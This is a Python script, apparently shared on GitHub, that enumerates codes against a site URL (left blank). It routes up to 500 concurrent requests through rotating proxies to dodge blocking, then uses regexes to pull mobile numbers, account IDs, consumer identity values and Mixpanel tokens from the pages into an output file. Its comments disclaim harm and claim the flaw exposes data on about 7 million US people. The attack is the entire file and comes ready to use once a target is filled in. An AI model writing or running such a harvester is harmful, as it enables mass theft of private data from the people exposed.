import random
import asyncio
import aiohttp
from aiohttp_socks import ProxyConnector
from python_socks._errors import ProxyError
import re
from datetime import datetime
import os

# This code is brought to you by Kendall Discord: kenyspc - https://github.com/Razshy
# Replications and/or modifications of this code are allowed 
# This code isnt meant to be used for any harm to companies or people 
# This code was made to bring attention and help people thats data is freely being exposed
# I do not condone use of this code to be used to harm any human being or company
# This is a fairly simple code and its sad to see that experimentally 7 Millon people in the USA  information can be exposed so easy

# Here what im working on next :) 
# Noun.com which is going to be a marketplace and social media app on IOS, Android, and the Web 
# Check it out when it comes out!!!

# And if you haven't already watched the officially video documenting Ai helping create this 
# Watch via - 

PROXIES = []
FAILED_CODES = set()
COUNTER = 0
LAST_PRINT_TIME = 0

def load_proxies(file_path):
    global PROXIES
    with open(file_path, 'r') as f:
        PROXIES = [line.strip() for line in f if line.strip()]

def load_failed_codes():
    global FAILED_CODES
    if os.path.exists("fail.txt"):
        with open("fail.txt", 'r') as f:
            for line in f:
                if "Code:" in line:
                    code = line.split("Code:")[1].strip()
                    FAILED_CODES.add(code)
    return len(FAILED_CODES)

async def check_code(session, code, max_retries=3, base_delay=1):
    url = f"http:// /{code}" # Enter the site url before the code 
    for attempt in range(max_retries):
        try:
            async with session.get(url, timeout=15) as response:
                if response.status == 403:
                    return "forbidden"
                content = await response.text()
                if 'KMGlobals' in content: # change this to what part of the code you want to extract from
                    return content
                else:
                    raise ValueError("Expected content not found")
        except (aiohttp.ClientError, asyncio.TimeoutError, ValueError) as e:
            if attempt == max_retries - 1:
                return "failed"
            delay = base_delay * (2 ** attempt) + random.uniform(0, 1)
            await asyncio.sleep(delay)
    return "failed"

async def extract_data(html_content):
    if not html_content or html_content in ["forbidden", "failed"]:
        return None
    data = {}
    patterns = { # change this to what you want to pull from the selected area of the site
        "mobile": r'"PII_MOBILE":"(.*?)"',
        "propertyCode": r'"propertyCode":"(.*?)"',
        "accountId": r'"accountId":(\d+)',
        "channelId": r'"channelId":(\d+)',
        "MIXPANELTOKEN": r'"MIXPANELTOKEN":"(.*?)"',
        "CONSUMER_IDENTITY": r'"CONSUMER_IDENTITY":"(.*?)"'
    }
    for key, pattern in patterns.items():
        match = re.search(pattern, html_content)
        if match:
            data[key] = match.group(1)
    return data if any(data.values()) else None

def save_data(data, code, filename="output.txt"):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(filename, "a") as f:
        f.write(f"[{timestamp}] User1 - Code: {code}\n\n")
        for key, value in data.items():
            f.write(f"{key}: \"{value}\"\n")
        f.write("\n")

def log_failed2(code, filename="failed2.txt"):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(filename, "a") as f:
        f.write(f"[{timestamp}] Failed - Code: {code}\n")

def update_counter():
    global COUNTER, LAST_PRINT_TIME
    COUNTER += 1
    current_time = asyncio.get_event_loop().time()
    if current_time - LAST_PRINT_TIME >= 1:  # Print every second
        print(f"Progress: {COUNTER}/{len(FAILED_CODES)} codes rechecked")
        LAST_PRINT_TIME = current_time

async def process_code(proxy, code):
    try:
        connector = ProxyConnector.from_url(f'http://{proxy}')
        async with aiohttp.ClientSession(connector=connector) as session:
            result = await check_code(session, code)
            
            if result == "failed":
                log_failed2(code)
            elif result != "forbidden":
                data = await extract_data(result)
                if data:
                    save_data(data, code)
                    print(f"Data extracted for code: {code}")
            
            update_counter()
            await asyncio.sleep(0.5)  # Slower pace for rechecking
    except ProxyError as e:
        print(f"Proxy error with {proxy}: {str(e)}. Skipping this code.")
    except Exception as e:
        print(f"Unexpected error processing code {code}: {str(e)}. Skipping this code.")

async def main_async():
    load_proxies('proxyscrape_premium_http_proxies.txt')
    
    global COUNTER
    total_failed = load_failed_codes()
    
    print(f"Loaded {total_failed} failed codes. Starting the rechecking process...")
    max_concurrent = 500  # Adjust this value (good PC? good proxies? = higher)
    semaphore = asyncio.Semaphore(max_concurrent)
    
    async def limited_process_code(proxy, code):
        async with semaphore:
            await process_code(proxy, code)
    
    tasks = []
    for code in FAILED_CODES:
        proxy = random.choice(PROXIES)
        tasks.append(asyncio.create_task(limited_process_code(proxy, code)))
    
    await asyncio.gather(*tasks)

def main():
    try:
        asyncio.run(main_async())
    except KeyboardInterrupt:
        print("\nScript interrupted. Progress saved in output files.")
    finally:
        print(f"Total codes rechecked: {COUNTER}")

if __name__ == "__main__":
    main()